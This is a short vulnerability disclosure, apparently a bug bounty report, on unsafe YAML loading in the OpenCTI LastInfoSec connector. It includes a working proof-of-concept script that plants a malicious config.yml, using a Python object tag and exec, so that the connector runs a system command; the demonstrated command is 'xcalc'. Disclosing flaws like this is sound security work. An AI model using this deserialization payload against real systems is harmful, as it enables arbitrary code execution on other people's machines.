# Description

`OpenCTI connectors` is used to store the OpenCTI connectors for the platform integration with other tools and applications. `OpenCTI LastInfoSec connector` is using the /v2/stix21/getlasthour API, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
git clone https://github.com/OpenCTI-Platform/connectors
```

### Run exploit.py
```
import os
#os.sysem('git clone https://github.com/OpenCTI-Platform/connectors')
os.chdir('connectors/lastinfosec/src')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
os.system('python lastinfosec.py')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
